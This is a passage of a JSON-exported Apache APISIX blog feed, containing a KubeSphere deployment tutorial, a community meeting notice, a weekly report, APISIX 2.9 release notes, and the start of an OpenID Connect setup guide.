parameters\\n- `Request` object parameter can get request information\\n- `Response` object parameter can set the response information\\n- `self.config` can get the plugin configuration information\\n- Calling `self.stop()` in the `filter` function will immediately break the request and respond to the data.\\n- When `self.rewrite()` is called in the `filter` function, the request will continue.\\n\\n## Welcome to participate\\n\\nThe `Runner` for `Apache APISIX` languages is still in the early stages of development, and we will continue to improve its functionality. A successful open source project cannot be achieved without everyone\'s participation and contribution, welcome to participate in `Apache APISIX Runner`.\\nLet\'s build a bridge between `Apache APISIX` and other languages together.\\n\\n- [apisix-python-plugin-runner](https://github.com/apache/apisix-python-plugin-runner)\\n- [apisix-go-plugin-runner](https://github.com/apache/apisix-go-plugin-runner)\\n- [apisix-java-plugin-runner](https://github.com/apache/apisix-java-plugin-runner)\\n\\n## Related Reading\\n\\n- [Go gives Apache APISIX a run for its money](http://apisix.apache.org/blog/2021/08/19/go-makes-Apache-APISIX-better)\\n- [How to write Apache APISIX plugins in Java](https://apisix.apache.org/blog/2021/06/21/use-Java-to-write-Apache-APISIX-plugins)"},{"id":"2021/08/31/apache-apisix-kubeSphere-a-better-gateway-and-k8s-ingress-controller","metadata":{"permalink":"/blog/2021/08/31/apache-apisix-kubeSphere-a-better-gateway-and-k8s-ingress-controller","source":"@site/blog/2021/08/31/Apache APISIX \xd7 KubeSphere-a-better-gateway-and-K8S-Ingress-Controller.md","title":"Apache APISIX \xd7 KubeSphere: Providing a better gateway and K8S Ingress Controller","description":"This article describes the direct deployment of Apache APISIX and APISIX Ingress Controller in KubeSphere using the official Apache APISIX Helm repository.","date":"2021-08-31T00:00:00.000Z","formattedDate":"August 31, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.485,"truncated":true,"authors":[{"name":"Jintao Zhang","url":"https://github.com/tao12345666333","imageURL":"https://avatars.githubusercontent.com/u/3264292?v=4"}],"prevItem":{"title":"Python helps you develop Apache APISIX plugin","permalink":"/blog/2021/09/06/python-helps-you-quickly-with-apache-apisix-development"},"nextItem":{"title":"Webinar\uff5c Apache APISIX Ingress Community Meeting","permalink":"/blog/2021/08/30/ingress-meeting"}},"content":"> This article describes the direct deployment of Apache APISIX and APISIX Ingress Controller in KubeSphere using the official Apache APISIX Helm repository. And Apache APISIX can be used as a gateway or a data plane for APISIX Ingress Controller to carry business traffic.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction to KubeSphere\\n\\n[KubeSphere](https://kubesphere.io/) is a cloud-native application-oriented system built on top of Kubernetes, fully open source, supporting multi-cloud and multi-cluster management, providing full-stack IT automation capabilities, and simplifying enterprise DevOps workflows. Its architecture makes it easy to integrate third-party applications with cloud-native eco-components in a plug-and-play fashion.\\n\\nAs a full-stack, multi-tenant container platform, KubeSphere provides an operations-friendly, wizard-based interface to help organizations quickly build a powerful and feature-rich container cloud platform. DevOps, application lifecycle management, microservice governance (service grid), log query and collection, service and networking, multi-tenant management, monitoring and alerting, event and audit queries, storage management, access control, GPU support, network policies, image repository management, and security management.\\n\\n## Introduction to Apache APISIX\\n\\n[Apache APISIX](https://github.com/apache/apisix) is an open source, high-performance, dynamic cloud-native gateway donated to the Apache Foundation by Shenzhen Tributary Technology Co. Apache APISIX currently covers API gateways, LB, Kubernetes Ingress, Service Mesh, and many other scenarios.\\n\\n## Prerequisites\\n\\nExisting Kubernetes clusters already managed in KubeSphere.\\n\\n## Deploy Apache APISIX and Apache APISIX Ingress Controller\\n\\nWe can either enable KubeSphere\'s [AppStore](https://kubesphere.io/docs/pluggable-components/app-store/) by referring to KubeSphere\'s documentation, or use the [Helm repository](https://kubesphere.io/docs/pluggable-components/app-store/) using Apache APISIX (https://charts.apiseven.com) for deployment. Here, we directly use the Helm repository of Apache APISIX for deployment.\\n\\nExecute the following command to add the Helm repo for Apache APISIX and complete the deployment.\\n\\n```shell\\n\u279c ~ helm repo add apisix https://charts.apiseven.com\\n\\"apisix\\" has been added to your repositories\\n\u279c ~ helm repo add bitnami https://charts.bitnami.com/bitnami\\n\\"bitnami\\" has been added to your repositories\\n\u279c ~ helm repo update\\n\u279c ~ kubectl create ns apisix\\nnamespace/apisix created\\n\u279c ~ helm install apisix apisix/apisix --set gateway.type=NodePort --set ingress-controller.enabled=true --namespace apisix\\nW0827 18:19:58.504653 294386 warnings.go:70] apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition\\nNAME: apisix\\nLAST DEPLOYED: Fri Aug 27 18:20:00 2021\\nNAMESPACE: apisix\\nSTATUS: deployed\\nREVISION: 1\\nTEST SUITE: None\\nNOTES:\\n1: Get the application URL by running these commands:\\n  export NODE_PORT=$(kubectl get --namespace apisix -o jsonpath=\\"{.spec.ports[0].nodePort}\\" services apisix-gateway)\\n  export NODE_IP=$(kubectl get nodes --namespace apisix -o jsonpath=\\"{.items[0].status.addresses[0].address}\\")\\n  echo http://$NODE_IP:$NODE_PORT\\n```\\n\\nVerify that it has been successfully deployed and is running.\\n\\n```shell\\n\u279c ~ kubectl -n apisix get pods\\nNAME                                         READY   STATUS    RESTARTS   AGE\\napisix-77d7545d4d-cvdhs                      1/1     Running   0          4m7s\\napisix-etcd-0                                1/1     Running   0          4m7s\\napisix-etcd-1                                1/1     Running   0          4m7s\\napisix-etcd-2                                1/1     Running   0          4m7s\\napisix-ingress-controller-74c6b5fbdd-94ngk   1/1     Running   0          4m7s\\n```\\n\\nYou can see that the related Pods are running properly.\\n\\n## Deploying the sample project\\n\\nWe use `kennethreitz/httpbin` as a sample project for demonstration purposes. The deployment is also done directly in KubeSphere.\\n\\nJust select Services - Stateless Services and create it.\\n\\n![KubeSphere APISIX Ingress Controller demo](https://static.apiseven.com/202108/1630404138226-5475c163-d372-414e-af74-5c5a86f19629.png)\\n\\n![KubeSphere APISIX Ingress Controller demo](https://static.apiseven.com/202108/1630404173444-9bb73e0d-5bee-428e-a257-4685500344ef.png)\\n\\nYou can see the successful deployment in KubeSphere\'s Services and Loads interface, or you can check directly in the terminal to see if the deployment has succeeded.\\n\\n```shell\\n~ kubectl get pods,svc -l app=httpbin\\nNAME                             READY   STATUS    RESTARTS   AGE\\npod/httpbin-v1-7d6dc7d5f-5lcmg   1/1     Running   0          48s\\n\\nNAME              TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE\\nservice/httpbin   ClusterIP   10.96.0.5    <none>        80/TCP    48s\\n```\\n\\n## Using Apache APISIX as a Gateway Proxy\\n\\nWe start by demonstrating how to use Apache APISIX as a gateway to proxy services in a Kubernetes cluster.\\n\\n```shell\\nroot@apisix:~$ kubectl -n apisix exec -it `kubectl -n apisix get pods -l app.kubernetes.io/name=apisix -o name` -- bash\\nbash-5.1# curl httpbin.default/get\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.default\\",\\n    \\"User-Agent\\": \\"curl/7.77.0\\"\\n  },\\n  \\"origin\\": \\"10.244.2.9\\",\\n  \\"url\\": \\"http://httpbin.default/get\\"\\n}\\n```\\n\\nAs you can see, the sample project can be accessed normally from within the Apache APISIX Pod. Next, use Apache APISIX to proxy the sample project.\\n\\nHere we use `curl` to call the admin interface of Apache APISIX and create a route. All requests with host header `httpbin.org` are forwarded to the actual application service `httpbin.default:80`.\\n\\n```shell\\nbash-5.1# curl \\"http://127.0.0.1:9180/apisix/admin/routes/1\\" -H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{\\n  \\"uri\\": \\"/get\\",\\n  \\"host\\": \\"httpbin.org\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"httpbin.default:80\\": 1\\n    }\\n  }\\n}\'\\n{\\"node\\":{\\"key\\":\\"\\\\/apisix\\\\/routes\\\\/1\\",\\"value\\":{\\"host\\":\\"httpbin.org\\",\\"update_time\\":1630060883,\\"uri\\":\\"\\\\/*\\",\\"create_time\\":1630060883,\\"priority\\":0,\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"pass_host\\":\\"pass\\",\\"nodes\\":{\\"httpbin.default:80\\":1},\\"hash_on\\":\\"vars\\",\\"scheme\\":\\"http\\"},\\"id\\":\\"1\\",\\"status\\":1}},\\"action\\":\\"set\\"}\\n```\\n\\nYou\'ll get output similar to the above, next verify that the proxy is successful:\\n\\n```shell\\nbash-5.1# curl http://127.0.0.1:9080/get -H \\"HOST: httpbin.org\\"\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.77.0\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  },\\n  \\"origin\\": \\"127.0.0.1\\",\\n  \\"url\\": \\"http://httpbin.org/get\\"\\n}\\n```\\n\\nThe above output shows that the traffic of the example project has been proxied through Apache APISIX. Next, let\'s try to access the sample project outside the cluster via Apache APISIX.\\n\\n```shell\\nroot@apisix:~$ kubectl  -n apisix get svc -l app.kubernetes.io/name=apisix\\nNAME             TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\\napisix-admin     ClusterIP   10.96.33.97    <none>        9180/TCP       22m\\napisix-gateway   NodePort    10.96.126.83   <none>        80:31441/TCP   22m\\n```\\n\\nWhen deployed using Helm chart, the Apache APISIX port is exposed by default as a NodePort. We use the Node IP + NodePort port for access testing.\\n\\n```shell\\nroot@apisix:~$ curl http://172.18.0.5:31441/get -H \\"HOST: httpbin.org\\"\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.76.1\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  },\\n  \\"origin\\": \\"10.244.2.1\\",\\n  \\"url\\": \\"http://httpbin.org/get\\"\\n}\\n```\\n\\nAs you can see, **it is already possible to proxy services within the Kubernetes cluster outside the cluster via Apache APISIX as a gateway.**\\n\\n## Proxy services using APISIX Ingress Controller\\n\\nWe can add application routes (Ingress) directly in KubeSphere and Apache APISIX Ingress Controller will automatically sync the routing rules to Apache APISIX to complete the proxy for the service.\\n\\n![KubeSphere APISIX Ingress Controller demo](https://static.apiseven.com/202108/1630404265190-585b9b09-72d5-4320-b0fe-9cf8a73c55ea.png)\\n\\n![KubeSphere APISIX Ingress Controller demo](https://static.apiseven.com/202108/1630404325747-b92928dc-2c6b-4574-a49d-32b6bcb187f9.png)\\n\\n**Note** We added the annotation configuration of `kubernetes.io/ingress.class: apisix` to support multiple ingress-controller scenarios in the cluster.\\n\\nAfter saving, you can see the following screen.\\n\\n![KubeSphere APISIX Ingress Controller demo](https://static.apiseven.com/202108/1630404366474-dfe8ae08-f16d-417f-8ef3-3495ebda0f7d.png)\\n\\nTest if the proxy is successful under the terminal.\\n\\n```shell\\nroot@apisix:~$ curl http://172.18.0.5:31441/get -H \\"HOST: http-ing.org\\"  {  \\"args\\": {},   \\"headers\\": {    \\"Accept\\": \\"*/*\\",     \\"Host\\": \\"http-ing.org\\",     \\"User-Agent\\": \\"curl/7.76.1\\",     \\"X-Forwarded-Host\\": \\"http-ing.org\\"  },   \\"origin\\": \\"10.244.2.1\\",   \\"url\\": \\"http://http-ing.org/get\\"}\\n```\\n\\nYou can see that it is also proxied properly.\\n\\nIn addition to the above, Apache APISIX Ingress Controller extends Kubernetes by way of CRD, and you can also publish custom resources like `ApisixRoute` to expose services in Kubernetes to the public.\\n\\n## Summary\\n\\nYou can deploy Apache APISIX and APISIX Ingress Controller directly in KubeSphere using the official Apache APISIX Helm repository. And Apache APISIX can be used as a gateway or as a data plane for APISIX Ingress Controller to carry business traffic.\\n\\n## Future Outlook\\n\\nApache APISIX has already partnered with the KubeSphere community, so you can find Apache APISIX directly in KubeSphere\'s own application repository, without having to manually add a Helm repository."},{"id":"2021/08/30/ingress-meeting","metadata":{"permalink":"/blog/2021/08/30/ingress-meeting","source":"@site/blog/2021/08/30/Ingress-Meeting.md","title":"Webinar\uff5c Apache APISIX Ingress Community Meeting","description":"The Apache APISIX Ingress community meeting establishes communication channels with community users and developers to help everyone understand the direction and plans of the project.","date":"2021-08-30T00:00:00.000Z","formattedDate":"August 30, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.81,"truncated":true,"authors":[{"name":"Apache APISIX \u793e\u533a"}],"prevItem":{"title":"Apache APISIX \xd7 KubeSphere: Providing a better gateway and K8S Ingress Controller","permalink":"/blog/2021/08/31/apache-apisix-kubeSphere-a-better-gateway-and-k8s-ingress-controller"},"nextItem":{"title":"Weekly Report (Aug 23 - Aug 29)","permalink":"/blog/2021/08/30/weekly-report"}},"content":"> With the release of [Apache APISIX Ingress Controller version 1.0](https://apisix.apache.org/blog/2021/06/18/first-GA-version-v1.0-of-Apache-APISIX-Ingress-Controller-released), more and more developers have started to pay attention to the Apache APISIX Ingress solution. The Apache APISIX community hopes to establish a more direct communication channel with users and developers in the community to help them understand the development direction and development plans of Apache APISIX Ingress. We hope that every user and developer\'s voice will be heard. Therefore, the Apache APISIX community has started to organize bi-weekly online community meetings.\\n\\n\x3c!--truncate--\x3e\\n\\n## Meeting Schedule\\n\\nEvery two weeks (Wednesdays) at 2pm, each meeting is about 1 hour.\\n\\n## Meeting address\\n\\n[Tencent Conference](https://meeting.tencent.com/s/eTvhm052verD) ID: 377 1555 2043\\n\\n## Weekly Meeting Report\\n\\nYou can [this document](https://docs.qq.com/doc/DSEhMeGJ0UXdydFJy) to leave the topics you want to discuss in advance\\n\\n## Topics for each session may be\\n\\n- Discussion of some new feature requirements\\n- Sharing of technical architecture design\\n- Feedback on bugs\\n- Experiences and pitfalls in using Apache APISIX Ingress Controller by yourself or your team\\n- Testimonials or complaints about Apache APISIX Ingress Controller\\n\\nOf course, you are also very welcome to give your opinions or contribute your ideas to the construction of the Apache APISIX community, if you have suggestions and ideas for the meeting, please feel free to [issue](https://github.com/apache/apisix-ingress-controller/issues/614) and reply to it!\\n\\nWe welcome you to join us to discuss the Apache APISIX Ingress solution, and we welcome you to join the community of developers to build a better Apache APISIX Ingress Controller.\\n\\nIf you are interested in the technical direction of Apache APISIX, want to develop it together, or have other suggestions or comments, you can participate through the following channels: 1.\\n\\n1. subscribe and send an email to dev@apisix.apache.org\\nParticipate in the community the Apache Way way by subscribing to the [Subscription Guide](https://apisix.apache.org/docs/general/join). The mailing list is the most common way for the Apache community to communicate, and the community will actively respond to questions on the mailing list.\\n\\n2. Start a discussion in the Apache APISIX Github discussion\\nThe [discussion](https://github.com/apache/apisix/discussions) area is very active. From time to time, we\'ll also include a summary of frequently asked questions in the discussion to make them easier to find."},{"id":"Weekly Report (Aug 23 - Aug 29)","metadata":{"permalink":"/blog/2021/08/30/weekly-report","source":"@site/blog/2021/08/30/weekly-report.md","title":"Weekly Report (Aug 23 - Aug 29)","description":"The Apache APISIX Community Weekly Newsletter hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2021-08-30T00:00:00.000Z","formattedDate":"August 30, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.38,"truncated":true,"authors":[],"prevItem":{"title":"Webinar\uff5c Apache APISIX Ingress Community Meeting","permalink":"/blog/2021/08/30/ingress-meeting"},"nextItem":{"title":"Release Apache APISIX 2.9","permalink":"/blog/2021/08/27/release-apache-apisix-2.9"}},"content":"\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"The Apache APISIX Community Weekly Newsletter hopes to help community members better grasp the weekly progress of the Apache APISIX community and facilitate your participation in the Apache APISIX community.\\n\\nWe\'ve also put together some issues for those new to the community! If you are interested, don\'t miss them!\\n\\n## Contributor statistics\\n\\n![Number of new contributors](https://static.apiseven.com/202108/1630393952402-4965d35c-6b05-4f71-9966-2fea7f7939d3.JPG)\\n\\n![New contributors this week](https://static.apiseven.com/202108/1630393952406-9f61c39b-ea9e-4451-bd26-ab845a32a222.JPG)\\n\\n## Good first issue\\n\\n### Issue #4241\\n\\n**Link**: https://github.com/apache/apisix/issues/4241\\n\\n**Problem Description**: Now when adding the jwt-auth plugin to a service/route, the jwt token does not contain a \\"key\\" declaration.\\n\\n```shell\\n{\\n  \\"iss\\": \\"http://127.0.0.1\\",\\n  \\"client_id\\": \\"application1\\",\\n  \\"sub\\": \\"1234567890\\",\\n  \\"iat\\": 1516239022\\n}\\n```\\n\\n![Screenshot of issue description](https://static.apiseven.com/202108/1630393952407-b6a26364-6c36-47f6-82c2-81514c31f20b.PNG)\\n\\n### Issue #4441\\n\\n**Link**: [Issue #4441](https://github.com/apache/apisix/issues/4441)\\n\\n**Issue Description**: Now APISIX stream_routes parameter \\"remote_addr\\" only support single ip, need to support multiple ip or match rule like \\"192.168.0.0/16\\", like http routing parameter \\"remote_addr\\".\\n\\n### Issue #3601\\n\\n**Link**: [Issue #3601](https://github.com/apache/apisix/issues/3601)\\n\\n**Issue Description**: Currently APISIX only has unit tests for request-response gRPC proxies, and no tests related to streaming gRPC. Need to add test cases for streaming gRPC to it.\\n\\n### Issue #3931\\n\\n**Link**: [Issue #3931](https://github.com/apache/apisix/issues/3931)\\n\\n**Issue Description**: http_to_https in the redirect plugin lacks curl tests, need to add curl tests for http_to_https in the redirect plugin and update the documentation [Apache APISIX redirect plugin](http://apisix.apache.org/docs/apisix/plugins/redirect).\\n\\n## Feature highlights of the week\\n\\n- uri-blocker support for ignoring case when matching request URIs\\n  - **Related PR**: https://github.com/apache/apisix/pull/4868\\n  - **Contributor**: [okaybase](https://github.com/okaybase)\\n\\n- kafka-logger Support for configuring acks parameters for kafka producers\\n  - **Related PR**: https://github.com/apache/apisix/pull/4878\\n  - **Contributors**: [okaybase](https://github.com/okaybase)\\n\\n- kafka-logger supports configuring the cluster name parameter\\n  - **Related PR**: https://github.com/apache/apisix/pull/4876\\n  - **contributor**: [tzssangglass](https://github.com/tzssangglass)\\n\\n- referer-restriction Support for configuring blacklist\\n  - **Related PR**: https://github.com/apache/apisix/pull/4916\\n  - **Contributor**: [okaybase](https://github.com/okaybase)\\n\\n## Recommended blog posts of the week\\n\\n- [Centralized Authentication with the OpenID Connect Plugin for Apache APISIX](https://apisix.apache.org/blog/2021/08/25/Using-the-Apache-APISIX-OpenID-Connect-Plugin-for-Centralized-Authentication/): Apache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, etc. Apache APISIX not only supports plug-in dynamic changes and Apache APISIX\'s OpenID Connect plug-in supports OpenID, which allows users to replace authentication from traditional authentication mode to centralized authentication mode.\\n\\n- [Why did APISIX choose the Nginx + Lua technology stack?](https://apisix.apache.org/blog/2021/08/25/Why-Apache-APISIX-chose-Nginx-and-Lua): Provides the historical background and advantages of the Nginx + Lua technology stack chosen by APISIX, noting that \\" High performance + flexibility\\" is what makes APISIX stand out from other gateways.\\n\\n- [Apache APISIX 2.9 Released with More New Features!](https://apisix.apache.org/blog/2021/08/27/release-apache-apisix-2.9/): Apache APISIX version 2.9 is released! With 30+ developers, 100+ PR submissions, 2 new features, and improved support for plugins, find out what\'s new in Apache APISIX 2.9!"},{"id":"Release Apache APISIX 2.9","metadata":{"permalink":"/blog/2021/08/27/release-apache-apisix-2.9","source":"@site/blog/2021/08/27/release-apache-apisix-2.9.md","title":"Release Apache APISIX 2.9","description":"The Apache APISIX 2.9 version of the cloud native API gateway adds the authz-casbin plugin and the dynamic configuration of real-ip at the routing level.","date":"2021-08-27T00:00:00.000Z","formattedDate":"August 27, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.675,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Weekly Report (Aug 23 - Aug 29)","permalink":"/blog/2021/08/30/weekly-report"},"nextItem":{"title":"Centralized authentication using the OpenID Connect plugin for Apache APISIX","permalink":"/blog/2021/08/25/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication"}},"content":"> Apache APISIX version 2.9 is released!\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX version 2.9 is officially released! \ud83c\udf89 This release has 30+ developers, 100+ PR submissions, 2 new features, and further improved support for plugins, come and learn about the new features in Apache APISIX 2.9!\\n\\n## New Plugin: authz-casbin\\n\\nThe Casbin community has contributed [authz-casbin](https://github.com/apache/apisix/blob/d9b928321fcdd12eef024df8c7c410424c1e0c8b/docs/en/latest/) to APISIX plugins/authz-casbin.md) plugin to APISIX, and in the new APISIX 2.9 release, APISIX can combine Casbin to do granular permission management at the route level.\\n\\nCasbin is an open source access control framework that supports configuration to decide whether to allow a certain access operation. With the authz-casbin plugin, we can do multiple roles of access control in one route at the same time.\\n\\nThis control can be set either through a configuration file or through the APISIX Control Plane; it can take effect for a given route or set global defaults. It is very flexible.\\n\\nIf you are interested in this plugin, you are welcome to read [Authorization with Casbin in Apache APISIX](https://apisix.apache.org/blog/2021/08/25/Auth-with-Casbin-in-Apache-APISIX).\\n\\n## New Feature: Dynamic Configuration of real-ip at Route Level\\n\\nApache APISIX version 2.9 now supports dynamic configuration of real-ip at the route level!\\n\\nThe new version adds the [real-ip](https://apisix.apache.org/zh/docs/apisix/plugins/real-ip/) plugin, which dynamically changes the IP and port of the client seen by APISIX.\\n\\nWe can use this plugin to dynamically set real-ip parameters.\\n\\n```JSON\\n{\\n    \\"plugins\\": {\\n        \\"real-ip\\": {\\n            \\"source\\": \\"http_x_forwarded_for\\",\\n            \\"trusted_addresses\\": [\\"127.0.0.0/24\\"]\\n        }\\n    }\\n}\\n```\\n\\n## Improvement: External Plug-in Mechanism\\n\\nApache APISIX version 2.9 further improves the support for external plugins with two major changes:\\n\\n1. When sending a plugin configuration to Plugin Runner, a unique key is sent. because APISIX is a multi-process architecture, in the past, a plugin configuration was sent several times, causing Plugin Runner to update the plugin configuration repeatedly. Now, with this unique key, Plugin Runner can identify duplicate configurations. This makes it possible to implement a plug-in inside Plugin Runner that limits flow!\\n\\n2. Add a mechanism to get APISIX information from Plugin Runner in the reverse direction. In addition to the request header and request path information sent from APISIX to Plugin Runner, Plugin Runner can also query information from APISIX in the reverse direction. The Var API has been implemented in the Go Plugin Runner implementation to use this mechanism to get information about Nginx variables such as the request_time of the request.\\n\\nThe [Go Plugin Runner](https://github.com/apache/apisix-go-plugin-runner/tree/6f249010b83a124bc30e940635db7fa0838e2c4a), which includes this change, will be released next week Version 0.2.0 will be released next week, so stay tuned!\\n\\n## Improvement: Existing Plug-ins Enhancement\\n\\nAPISIX version 2.9 improves the functionality of existing plugins with two major changes:\\n\\n1. the [request-id](https://apisix.apache.org/docs/apisix/plugins/request-id/) plugin supports ID generation via the snowflake algorithm. the snowflake ID generation algorithm is a distributed ID generation mechanism, which generates The snowflake ID generation algorithm is a distributed ID generation mechanism that combines machine IDs, timestamps, and generation sequences. We use etcd to ensure that each worker is assigned a unique machine ID.\\n\\n2. The [error-log-logger](https://apisix.apache.org/docs/apisix/plugins/error-log-logger/) plugin supports reporting error logs to skywalking, adding to the observability of APISIX. This adds to the observability of APISIX.\\n\\n## Download\\n\\nDownload Apache APISIX 2.9\\n\\n- Source code: please visit [download page](https://apisix.apache.org/downloads/)\\n- Binary installation package: please visit [Installation Guide](https://apisix.apache.org/docs/apisix/how-to-build/)"},{"id":"2021/08/25/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication","metadata":{"permalink":"/blog/2021/08/25/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication","source":"@site/blog/2021/08/25/Using-the-Apache-APISIX-OpenID-Connect-Plugin-for-Centralized-Authentication.md","title":"Centralized authentication using the OpenID Connect plugin for Apache APISIX","description":"Using the openid-connect plugin of the cloud-native API gateway Apache APISIX can quickly interface with the centralized authentication solution OKat.","date":"2021-08-25T00:00:00.000Z","formattedDate":"August 25, 2021","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":9.815,"truncated":true,"authors":[{"name":"Xinxin Zhu","title":"Author","url":"https://github.com/starsz","image_url":"https://avatars.githubusercontent.com/u/25628854?v=4","imageURL":"https://avatars.githubusercontent.com/u/25628854?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Release Apache APISIX 2.9","permalink":"/blog/2021/08/27/release-apache-apisix-2.9"},"nextItem":{"title":"Why Apache APISIX chose Nginx and Lua to build API Gateway","permalink":"/blog/2021/08/25/why-apache-apisix-chose-nginx-and-lua"}},"content":"> Compared with the traditional authentication mode, the centralized authentication mode has the following advantages: first, it simplifies the application development process, reduces the development application workload and maintenance costs, and avoids repeated development of authentication code for each application; second, it improves business security, and the centralized authentication mode can intercept unauthenticated requests at the gateway level in time to protect back-end applications.\\n\\n\x3c!--truncate--\x3e\\n\\n## What is Apache APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, and more. Apache APISIX\'s OpenID Connect plug-in supports OpenID, which allows users to replace authentication from traditional authentication mode to centralized authentication mode.\\n\\n## What is authentication\\n\\nAuthentication refers to the verification of a user\'s identity through certain means. The application identifies the user through authentication and obtains detailed user metadata from the Identity Provider based on the user identity ID, and uses it to determine whether the user has access to the specified resources. Authentication modes are divided into two categories: **Traditional Authentication Mode** and **Centralized Authentication Mode**.\\n\\n### Traditional authentication mode\\n\\nIn traditional authentication mode, each application service needs to support authentication separately, such as accessing the login interface when the user is not logged in, and the interface returns a 301 jump page. The application needs to develop the logic for maintaining the Session and the authentication interaction with the identity provider. The flow of the traditional authentication model is shown in the figure below: first, the user initiates a request, then the gateway receives the request and forwards it to the corresponding application service, and finally the application service interfaces with the identity provider to complete the authentication.\\n\\n![Flowchart of traditional authentication mode](https://static.apiseven.com/202108/1639467045776-715e1805-540b-4cef-87c5-6166e2af43a8.png)\\n\\n### Centralized authentication mode\\n\\nUnlike the traditional authentication model, the centralized authentication model takes user authentication out of the application service. Take Apache APISIX as an example, the centralized authentication process is shown in the following diagram: first, the user initiates a request, and then the front gateway is responsible for the user authentication process, interfacing with the identity provider and sending the identity provider an authorization) request to the identity provider. The identity provider returns user info. After the gateway identifies the user, it forwards the user identity information to the back-end application in the form of a request header.\\n\\n![Flow chart of centralized authentication mode](https://static.apiseven.com/202108/1639467122244-d4292436-c5ce-48f6-b1d5-67645f24fbc9.png)\\n\\nCompared with the traditional authentication mode, the centralized authentication mode has the following advantages.\\n\\n1. simplify the application development process, reduce the development of application workload and maintenance costs, to avoid the repeated development of each application authentication code.\\n2. improve business security, centralized authentication mode at the gateway level to intercept unauthenticated requests in time to protect the back-end applications.\\n\\n## What is OpenID\\n\\nOpenID is a centralized authentication model, which is a decentralized identity system. The benefit of using OpenID is that users only need to register and log in with one OpenID identity provider\'s website and use one account password information to access different applications. okta is a common OpenID identity provider and the Apache APISIX OpenID Connect plugin supports OpenID so users can use the plugin to to replace the traditional authentication model with a centralized authentication model.\\n\\n### OpenID Authentication Process\\n\\nThe OpenID authentication process has the following 7 steps, as shown in the figure below. 1.\\n\\n1. APISIX initiates an authentication request to Identity Provider. 2.\\n2. The user logs in and authenticates on the Identity Provider. 3.\\n3. The Identity Provider returns to APISIX with the Authorization Code. 4.\\n4. APISIX requests the Identity Provider with the Code extracted from the request parameters. 5.\\n5. The Identity Provider sends an answer message to APISIX containing the ID Token and Access Token. 6.\\n6. APISIX sends the Access Token to the Identity Provider\'s User Endpoint to obtain the user\'s identity.\\n7. After authentication, the User Endpoint sends the User info to APISIX to complete the authentication.\\n\\n![OpenID Authentication Flowchart](https://static.apiseven.com/202108/1639467187923-71854ddb-65fd-4a90-8bd0-242b47a8624b.png)\\n\\n## How to configure Okta authentication using the OpenID Connect plugin for Apache APISIX\\n\\nConfiguring Okta authentication using the Apache APISIX OpenID Connect plug-in is a simple three-step process that allows you to switch from traditional to centralized authentication mode. The following section describes the steps to configure Okta authentication using the OpenID Connect plug-in for Apache APISIX.\\n\\n### Prerequisites\\n\\nAn Okta account already exists.\\n\\n### Step 1: Configure Okta\\n\\n1. Login to your Okta account and create an Okta application, select the OIDC login mode and the Web Application application type.\\n    ![Create an Okta application](https://static.apiseven.com/202108/1639467243454-ac16645a-4a8a-426f-93a2-e840cae3c502.png)\\n    ![Select OIDC login mode and Web Application application type](https://static.apiseven.com/202108/1639467299429-0ea741a7-95fd-43b5-a0c4-25a7026e62d2.png) 2.\\n2. Set the login and logout jump URLs.\\nThe \\"Sign-in redirect URIs\\" are the links that are allowed to be redirected after successful login, and the \\"Sign-out redirect URIs\\" are the links that are redirected after logging out. In this example, we set both the sign-in redirect and sign-out redirect URLs to `http://127.0.0.1:9080/`.\\n    ![Set the login and logout URL](https://static.apiseven.com/202108/1639467390099-e9594a05-7e78-4f20-a902-7c4ca2c302fb.png)\\n3. Click \\"Save\\" to save the changes after finishing the settings.\\n    ![Save Changes](https://static.apiseven.com/202108/1639467449049-628d7796-0d8e-4ed9-8334-5ba7f0fb32f4.png)\\nVisit the General page of the application to get the following configuration, which is required to configure Apache APISIX OpenID Connect.\\n\\n- Client 